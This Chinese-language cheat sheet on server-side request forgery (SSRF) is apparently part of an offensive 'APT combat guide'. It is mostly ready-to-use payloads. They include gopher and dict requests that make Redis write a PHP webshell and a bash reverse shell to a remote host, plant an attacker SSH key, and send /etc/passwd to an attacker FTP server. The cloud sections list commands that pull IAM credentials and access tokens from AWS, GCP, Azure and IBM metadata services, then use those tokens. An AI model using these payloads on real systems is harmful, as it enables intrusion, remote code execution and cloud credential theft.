# SSRF

PHP函数：

+ file_get_contents

+ fsockopen

+ curl_exec

+ fopen

+ mdf_file

## 协议

(1)HTTP/HTTPS

```html
ssrf.php?page=http://127.0.0.1:80
ssrf.php?page=http://127.0.0.1:8080
ssrf.php?page=https://127.0.0.1
```

(2)File

```html
ssrf.php?page=file:///etc/passwd
ssrf.php?page=file://\/\/etc/passwd
```

(3)Dict

```html
dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
ssrf.php?page=dict://服务器地址:11111/
```

(4)文件传输协议

```html
ftp://user:password@目标站点/  //FTP协议
tftp://目标站点/../file.txt //TFTP协议
sftp://目标站点:11111/  //SFTP协议
```

(5)LDAP

```html
ssrf.php?page=ldap://localhost:11211/%0astats%0aquit
```

(6)SMB

```html
ssrf.php?page=smb://server/share
```

(7)Redis/Memcached

Redis
```html
/proxy?url=redis://Redis服务器地址:6379/set%20mykey%20myvalue
```

Memcached
```html
/proxy?url=memcached://Memcached服务器地址:11211/stats
```

```html
/proxy?url=memcached://Memcached服务器地址:11211/set%20session_user_id%200%20200%2010
//用值0覆盖Memcached中应用程序的会话密钥（session_user_id）
/proxy?url=memcached://Memcached服务器地址:11211/get%20session_user_id
//获取密钥session_user_id的值，用于验证先前的设置命令是否成功
```

(8)Gopher

格式
```html
gopher://host:port/selector
```

与SMTP通信发送电子邮件
```html
GET /ssrf?url=gopher://内部SMTP服务器地址:25/_MAIL%20FROM%3A%3Csnowwolf%40test.com%3E%0D%0ARCP%54%20TO%3A%3Cuser%40example.com%3E%0D%0ADATA%0D%0ASubject%3A%20SSRF%20Test%0D%0A%0D%0AThis%20is%20an%20email%20sent%20via%20SSRF%20exploit.%0D%0A.%0D%0AQUIT%0D%0A HTTP/1.1
```

SMTP页面
```html
<?php
        $commands = array(
                'HELO victim.com',
                'MAIL FROM: <admin@ghostwolflab.com>',
                'RCPT To: <admin@test.com>',
                'DATA',
                'Subject: @security!',
                'Hello, woot woot!',
                '.'
        );

        $payload = implode('%0A', $commands);

        header('Location: gopher://0:25/_'.$payload);
?>
```

创建MongoDB用户
```html
gopher://内部MongoDB服务器地址:27017/_%a0%00%00%00%00%00%00%00%00%00%00%00%dd%07%00%00%00%00%00%00%00%8b%00%00%00%02insert%00%06%00%00%00users%00%02$db%00%0a%00%00%00percetron%00%04documents%00V%00%00%00%030%00N%00%00%00%02username%00%06%00%00%00admin%00%02password%00%09%00%00%00admin123%00%02permission%00%0e%00%00%00administrator%00%00%00%00
```

HTTP
```html
gopher://<proxyserver>:8080/_GET http://<attacker:80>/x HTTP/1.1%0A%0A
gopher://<proxyserver>:8080/_POST%20http://<attacker>:80/x%20HTTP/1.1%0ACookie:%20eatme%0A%0AI+am+a+post+body
```

回连1337端口
```html
创建evil.com/redirect.php页面
<?php
header("Location: gopher://攻击者主机:1337/_SSRF%0ATest!");
?>

访问地址
https://目标WEB应用程序/?q=http://evil.com/redirect.php
```


(9)Netdoc

```html
ssrf.php?url=netdoc:///etc/passwd
```

## 利用

(1)WSGI

易受攻击的WSGI应用程序
```html
def application(environ, start_response):
//环境变量包含SSRF攻击期间服务器传递的信息
    url = environ.get('HTTP_X_TARGET_URL')
    if url and url.startswith("http"):
    //验证不足，还应该考虑其它请求协议和内部资源的访问
        content = urlopen(url).read()
        //如果url来自不受信任的来源，则可能出现SSRF漏洞
```

payload
```html
gopher://WSGI服务器地址:8000/_%00%1A%00%00%0A%00WSGI_FILE%0C%00/tmp/test.py
```

脚本

[WSGI](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/payloads/SSRF/WSGI.py)

| 标头      |           |             |
|-----------|-----------|-------------|
| modifier1 | (1 byte)  | 0 (%00)     |
| datasize  | (2 bytes) | 26 (%1A%00) |
| modifier2 | (1 byte)  | 0 (%00)     |

| 变量     (UWSGI_FILE) |           |    |            |   |
|-----------------------|-----------|----|------------|---|
| key length            | (2 bytes) | 10 | (%0A%00)   |   |
| key data              | (m bytes) |    | UWSGI_FILE |   |
| value length          | (2 bytes) | 12 | (%0C%00)   |   |
| value data            | (n bytes) |    | /tmp/test.py   |   |


(2)Redis

SSH覆盖执行系统命令
```html
/proxy?url=redis://Redis服务器地址:6379/config%20set%20dir%20/var/lib/redis/.ssh/
# 将Redis保存数据的目录更改为Redeis进程运行时的用户目录.ssh
/proxy?url=redis:// Redis服务器地址:6379/config%20set%20dbfilename%20authorized_keys
# 将数据库文件名更改为authorized_keys，这是SSH服务器再确定SSH访问的授权公钥时查找的文件
/proxy?url=redis:// Redis服务器地址:6379/set%20mykey%20%22ssh-rsa%20AAAAB3Nza...user@attacker.com%22
# 将mykey密钥的值设置为攻击者的公共SSH密钥
/proxy?url=redis://Redis服务器地址:6379/save
# 指示Redis保存数据，这回将攻击者的公钥写入.ssh/authorized_keys文件，接下来便可以通过SSH连接Redis的服务器并执行系统命令
```

获取一个webshell
```html
url=dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html
url=dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20file.php
url=dict://127.0.0.1:6379/SET%20mykey%20"<\x3Fphp system($_GET[0])\x3F>"
url=dict://127.0.0.1:6379/SAVE
```

获取一个PHP回连的webshell
```html
url=gopher://127.0.0.1:6379/_config%20set%20dir%20%2Fvar%2Fwww%2Fhtml
url=gopher://127.0.0.1:6379/_config%20set%20dbfilename%20reverse.php
url=gopher://127.0.0.1:6379/_set%20payload%20%22%3C%3Fphp%20shell_exec%28%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FREMOTE_IP%2FREMOTE_PORT%200%3E%261%27%29%3B%3F%3E%22
url=gopher://127.0.0.1:6379/_save
```

(3)PDF

源文件
```pdf
%PDF-1.5
1 0 obj
<<
  /Type /XObject
  /Subtype /Image
  /Width 500
  /Height 500
  /Filter /DCTDecode
  /ColorSpace /DeviceRGB
  /Length 12345
  /F (http://攻击者主机地址/)
>>
stream
...二进制PDF文件数据...
endstream
endobj
```

```html
<link rel=attachment href="file:///root/secret.txt">
```

```html
<script>
    exfil = new XMLHttpRequest();
    exfil.open("GET","file:///etc/passwd");
    exfil.send();
    exfil.onload = function(){document.write(this.responseText);}
    exfil.onerror = function(){document.write('failed!')}
</script>
```

(4)SNI

SNI利用OpenSSL
```python
from OpenSSL import SSL
import socket

//建立TCP连接
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('外部允许的服务器地址', 443))

//创建SSL上下文
ctx = SSL.Context(SSL.SSLv23_METHOD)  //使用适当方法
ssl_sock = SSL.Connection(ctx, sock)

//设置SNI为内部目标地址
ssl_sock.set_tlsext_host_name(b'内部目标地址')

执行TLS握手
ssl_sock.do_handshake()

//通过SSL连接发送HTTP请求
ssl_sock.sendall(b"GET / HTTP/1.1\r\nHost: 外部允许的服务器地址\r\n\r\n")

//读取响应
response = ssl_sock.recv(4096)
print(response)

//取消连接
ssl_sock.shutdown()
ssl_sock.close()
```

命令
```bash
openssl s_client -connect 目标地址:443 -servername "内部目标地址" -crlf
```

(5)wget

```bash
wget --method=PUT --body-file=/etc/passwd ftp://攻击者主机/
```

(6)DoS

环回接口DoS攻击
```python
import requests
from urllib.parse import urlencode

base_url = "http://目标WEB应用程序地址/ssrf/ssrf.php?"
params = {
    "target": "http://localhost:8080/接口"
}
while True:
    full_url = base_url + urlencode(params)
    requests.get(full_url)
```

## 盲注

DNS
```html
http://受害者网站/ssrf?payload=http://攻击者的DNS服务器
```

时间延迟
```html
http://受害者网站/ssrf?payload=http://攻击者服务器/delay
```

更多盲注

[Blind](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/WEB%E6%BC%8F%E6%B4%9E%E8%BF%9B%E9%98%B6/SSRF/Blind.md)

## 云实例

### AWS

AWS实例元数据服务是Amazon EC2实例中提供的一项服务，允许这些实例访问有关自身的元数据

+ ipv4端点(旧版)：http://169.254.169.254/latest/meta-data/

+ ipv4端点(新版)需要X-aws-ec2-metadata-token标头

```bash
export TOKEN=`curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" "http://169.254.169.254/latest/api/token"`
curl -H "X-aws-ec2-metadata-token:$TOKEN" -v "http://169.254.169.254/latest/meta-data"
```

+ ipv6端点：http://[fd00:ec2::254]/latest/meta-data/

对于WAF，可能需要尝试不同的方法来连接到API

+ 指向AWS API 的DNS记录

```
http://instance-data
http://169.254.169.254
http://169.254.169.254.nip.io/
```

+ HTTP重定向

```
Static:http://nicob.net/redir6a
Dynamic:http://nicob.net/redir-http-169.254.169.254:80-
```

+ 对IP进行编码

```
http://425.510.425.510 Dotted decimal with overflow
http://2852039166 Dotless decimal
http://7147006462 Dotless decimal with overflow
http://0xA9.0xFE.0xA9.0xFE Dotted hexadecimal
http://0xA9FEA9FE Dotless hexadecimal
http://0x41414141A9FEA9FE Dotless hexadecimal with overflow
http://0251.0376.0251.0376 Dotted octal
http://0251.00376.000251.0000376 Dotted octal with padding
http://0251.254.169.254 Mixed encoding (dotted octal + dotted decimal)
http://[::ffff:a9fe:a9fe] IPV6 Compressed
http://[0:0:0:0:0:ffff:a9fe:a9fe] IPV6 Expanded
http://[0:0:0:0:0:ffff:169.254.169.254] IPV6/IPV4
http://[fd00:ec2::254] IPV6
```

访问启动实例时指定的用户数据
```
http://169.254.169.254/latest/user-data
```

查询有关实例的各种元数据的其它URL，例如主机名、ipv4地址和其它属性
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/reservation-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
http://169.254.169.254/latest/dynamic/instance-identity/document

Jira SSRF导致AWS信息泄露
https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/metadata/v1/maintenance

公开暴露
http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/
```

脚本

[EC2](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/payloads/SSRF/EC2.sh)

(1)IAM

获取临时凭证
```html
/ssrf?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/[Role Name]

# 例子
/ssrf?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
/ssrf?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
/ssrf?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
```

使用IAM凭证交互
```bash
aws s3 ls --region <region-name> --access-key-id <AccessKeyId> --secret-access-key <SecretAccessKey> --session-token <Token>
```

(2)ECS

如果在ECS实例上有可访问文件系统的SSRF，可以尝试提取/proc/self/environ以获取UUID

然后执行以下命令提取附加角色的IAM密钥
```bash
curl http://169.254.170.2/v2/credentials/<UUID>
```

(3)Elastic Beanstalk

从API中检索accountId和region
```
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
```

然后从API中检索AccessKeyId、SecretAccessKey和Token
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
```

然后我们将凭证与之一起使用
```bash
aws s3 ls s3://elasticbeanstalk-us-east-2-[ACCOUNT_ID]/
```

(4)Lambda

AWS Lambda为自定义运行时提供HTTP API，以从Lambda接收调用事件并将响应数据发送回Lambda执行环境
```
http://localhost:9001/2018-06-01/runtime/invocation/next
$ curl "http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next"
```

### Google Cloud

需要"Metadata-Flavor: Google"或"X-Google-Metadata-Request: True"标头
```
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/project/project-id
```

提取有趣端点的信息
```
# /project
# 项目名称及编号
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/project-id
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/numeric-project-id
# 项目属性
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/attributes/?recursive=true

# /oslogin
# users
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/users
# groups
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/groups
# security-keys
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/security-keys
# authorize
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/authorize

# /instance
# Description
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/description
# Hostname
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/hostname
# ID
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/id
# Image
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/image
# Machine Type
curl -s -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/machine-type
# Name
curl -s -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/name
# Tags
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/scheduling/tags
# Zone
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/zone
# User data
curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/attributes/startup-script"
# 网络接口
for iface in $(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/"); do
    echo "  IP: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/ip")
    echo "  Subnetmask: "$(curl -s -f -H "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/subnetmask")
    echo "  Gateway: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/gateway")
    echo "  DNS: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/dns-servers")
    echo "  Network: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/network")
    echo "  ==============  "
done
# 服务账户
for sa in $(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/"); do
    echo "  Name: $sa"
    echo "  Email: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}email")
    echo "  Aliases: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}aliases")
    echo "  Identity: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}identity")
    echo "  Scopes: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}scopes")
    echo "  Token: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}token")
    echo "  ==============  "
done
# K8s 属性
## 集群位置
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/cluster-location
## 集群名称
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/cluster-name
## Os-login enabled
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/enable-oslogin
## Kube-env
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/kube-env
## Kube-labels
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/kube-labels
## Kubeconfig
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/kubeconfig

# 所有自定义项目属性
curl "http://metadata.google.internal/computeMetadata/v1/project/attributes/?recursive=true&alt=text" \
    -H "Metadata-Flavor: Google"

# 所有自定义项目实例属性
curl "http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true&alt=text" \
    -H "Metadata-Flavor: Google"
```

递归拉取
```
http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
```

Beta不需要标头
```
http://metadata.google.internal/computeMetadata/v1beta1/
http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
```

使用Gopher SSRF设置所需的标头
```
gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a
```

有趣的文件
```
SSH公钥
http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json

获取访问令牌
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token

Kubernetes
http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json
```

(1)添加SSH密钥

提取令牌
```
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json
```

检查令牌的范围
```bash
$ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA  

{
        "issued_to": "101302079XXXXX",
        "audience": "10130207XXXXX",
        "scope": "https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring",
        "expires_in": 2443,
        "access_type": "offline"
}
```

提交SSH密钥
```bash
curl -X POST "https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata"
-H "Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA"
-H "Content-Type: application/json"
--data '{"items": [{"key": "sshkeyname", "value": "sshkeyvalue"}]}'
```

(2)使用泄露的服务账户令牌

通过环境变量
```bash
export CLOUDSDK_AUTH_ACCESS_TOKEN=<token>
gcloud projects list
```

通过设置
```bash
echo "<token>" > /some/path/to/token
gcloud config set auth/access_token_file /some/path/to/token
gcloud projects list
gcloud config unset auth/access_token_file
```

(3)云功能

```
# /project
# Project name and number
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/project-id
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/numeric-project-id

# /instance
# ID
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/id
# Zone
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/zone
# Auto MTLS config
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/platform-security/auto-mtls-configuration
# Service Accounts
for sa in $(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/"); do
    echo "  Name: $sa"
    echo "  Email: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}email")
    echo "  Aliases: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}aliases")
    echo "  Identity: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}identity")
    echo "  Scopes: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}scopes")
    echo "  Token: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}token")
    echo "  ==============  "
done
```

### Digital Ocean

```bash
curl http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address

curl http://169.254.169.254/metadata/v1.json | jq
```

### Packetcloud

[文档](https://metadata.packet.net/userdata)

### Azure

```
http://169.254.169.254/metadata/v1/maintenance
```

2017后，添加"Metadata: true"标头
```
http://169.254.169.254/metadata/instance?api-version=2017-04-02
http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
```

脚本

(1)Bash
```bash
HEADER="Metadata:true"
URL="http://169.254.169.254/metadata"
API_VERSION="2021-12-13" #https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service?tabs=linux#supported-api-versions

echo "Instance details"
curl -s -f -H "$HEADER" "$URL/instance?api-version=$API_VERSION"

echo "Load Balancer details"
curl -s -f -H "$HEADER" "$URL/loadbalancer?api-version=$API_VERSION"

echo "Management Token"
curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://management.azure.com/"

echo "Graph token"
curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://graph.microsoft.com/"

echo "Vault token"
curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://vault.azure.net/"

echo "Storage token"
curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://storage.azure.com/"
```

(2)PowerShell
```bash
# Powershell
Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -NoProxy -Uri "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | ConvertTo-Json -Depth 64
## 用户数据
$userData = Invoke- RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021- 01-01&format=text"
[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))

# 路径
/metadata/instance?api-version=2017-04-02
/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
/metadata/instance/compute/userData?api-version=2021-01-01&format=text
```

---

Azure App

```bash
# 检查这些环境变量以了解目前是否在Azure app环境中
echo $IDENTITY_HEADER
echo $IDENTITY_ENDPOINT

# 检查文件夹
ls /opt/microsoft
ls /opt/microsoft/msodbcsql17

# 获取管理令牌
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
# 获取graph令牌
curl "$IDENTITY_ENDPOINT?resource=https://graph.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER

# API
# 获取订阅
URL="https://management.azure.com/subscriptions?api-version=2020-01-01"
curl -H "Authorization: $TOKEN" "$URL"
# 获取订阅中资源的权限
URL="https://management.azure.com/subscriptions/<subscription-uid>/resources?api-version=2020-10-01'"
curl -H "Authorization: $TOKEN" "$URL"
# 获取VM的权限
URL="https://management.azure.com/subscriptions/<subscription-uid>/resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/<VM-name>/providers/Microsoft.Authorization/permissions?api-version=2015-07-01"
curl -H "Authorization: $TOKEN" "$URL"
```

```bash
# PowerShell中向管理端点发送API请求
$Token = 'eyJ0eX..'
$URI='https://management.azure.com/subscriptions?api-version=2020-01-01'
$RequestParams = @{
 Method = 'GET'
 Uri = $URI
 Headers = @{
  'Authorization' = "Bearer $Token"
 }
}
(Invoke-RestMethod @RequestParams).value

# 向graph端点发送API请求 (获取企业应用程序)
$Token = 'eyJ0eX..'
$URI = 'https://graph.microsoft.com/v1.0/applications'
$RequestParams = @{
 Method = 'GET'
 Uri = $URI
 Headers = @{
 'Authorization' = "Bearer $Token"
 }
}
(Invoke-RestMethod @RequestParams).value

# 使用不带管理令牌和graph令牌的AzureAD PowerShell模块
$token = 'eyJ0e..'
$graphaccesstoken = 'eyJ0eX..'
Connect-AzAccount -AccessToken $token -GraphAccessToken $graphaccesstoken -AccountId 2e91a4f12984-46ee-2736-e32ff2039abc

# 尝试获取资源的当前权限
Get-AzResource
## 以下错误表示用户没有任何资源的权限
Get-AzResource : 'this.Client.SubscriptionId' cannot be null.
At line:1 char:1
+ Get-AzResource
+ ~~~~~~~~~~~~~~
 + CategoryInfo : CloseError: (:) [Get-AzResource],ValidationException
 + FullyQualifiedErrorId :
Microsoft.Azure.Commands.ResourceManager.Cmdlets.Implementation.GetAzureResourceCmdlet
```

### IBM

在IBM中，默认情况下元数据未启用，因此即使位于IBM云VM内，也可能无法访问它

```bash
export instance_identity_token=`curl -s -X PUT "http://169.254.169.254/instance_identity/v1/token?version=2022-03-01"\
  -H "Metadata-Flavor: ibm"\
  -H "Accept: application/json"\
  -d '{
        "expires_in": 3600
      }' | jq -r '(.access_token)'`

# 获取实例详细信息
curl -s -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" -X GET "http://169.254.169.254/metadata/v1/instance?version=2022-03-01" | jq

# 获取SSH密钥信息
curl -s -X GET -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/metadata/v1/keys?version=2022-03-01" | jq

# 获取SSH密钥指纹和用户数据
curl -s -X GET -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/metadata/v1/instance/initialization?version=2022-03-01" | jq

# 获取归置组
curl -s -X GET -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/metadata/v1/placement_groups?version=2022-03-01" | jq

# 获取IAM凭证
curl -s -X POST -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/instance_identity/v1/iam_token?version=2022-03-01" | jq
```



### OpenStack/RackSpace

```
http://169.254.169.254/openstack
```

### HP Helion

```
http://169.254.169.254/2009-04-04/meta-data/
```

### Oracle

```
http://192.0.0.192/latest/
http://192.0.0.192/latest/user-data/
http://192.0.0.192/latest/meta-data/
http://192.0.0.192/latest/attributes/
```

### Alibaba

```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/image-id
```

### Kubernetes ETCD

```bash
curl -L http://127.0.0.1:2379/version
curl http://127.0.0.1:2379/v2/keys/?recursive=true
```

### Docker

```bash
http://127.0.0.1:2375/v1.24/containers/json

简单例子
docker run -ti -v /var/run/docker.sock:/var/run/docker.sock bash
bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/containers/json
bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/images/json
```

### Rancher

```bash
curl http://rancher-metadata/<version>/<path>
```

## WAF

[SSRF Bypass](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/WEB%E6%BC%8F%E6%B4%9E%E8%BF%9B%E9%98%B6/SSRF/waf.md)
